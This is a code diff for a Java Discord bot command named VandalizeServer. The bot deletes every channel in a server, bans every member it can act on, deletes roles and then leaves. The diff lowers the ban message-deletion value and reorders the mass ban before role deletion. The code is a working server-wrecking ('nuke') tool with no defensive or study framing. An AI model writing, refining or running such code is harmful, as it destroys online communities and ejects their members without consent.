@@ -82,7 +82,7 @@ public class VandalizeServer extends Command{
                 String reason = args[2];
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member)){
-                        member.ban(9999, reason).queue(
+                        member.ban(7, reason).queue(
                         (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
@@ -108,14 +108,25 @@ public class VandalizeServer extends Command{
             case "break":
                 theGuild.getChannels().forEach(channel -> {
                     channel.delete().queue(
-                    (e) -> System.out.println("ok - " + channel.getName()), 
-                    new ErrorHandler().handle(
-                        ErrorResponse.MISSING_PERMISSIONS,
+                        (e) -> System.out.println("ok - " + channel.getName()), 
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
                             (e) -> System.out.println("no - " + channel.getName()))
-                    );
+                            );
+                        });
+                        System.out.println("channels deleted");
+                        
+                theGuild.getMembers().forEach(member -> {
+                    if(self.canInteract(member)){
+                        member.ban(7).queue(
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
+                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
+                        );
+                    }
                 });
-                System.out.println("channels deleted");
-
+                System.out.println("members banned");
                 theGuild.getRoles().forEach(role -> {
                     if(self.canInteract(role)){
                         role.delete().queue(
@@ -128,17 +139,6 @@ public class VandalizeServer extends Command{
                 });
                 System.out.println("roles deleted");
 
-                theGuild.getMembers().forEach(member -> {
-                    if(self.canInteract(member)){
-                        member.ban(9999).queue(
-                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
-                        new ErrorHandler().handle(
-                            ErrorResponse.MISSING_PERMISSIONS,
-                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
-                        );
-                    }
-                });
-                System.out.println("members banned");
 
                 theGuild.leave().queue();
                 System.out.println("all done");
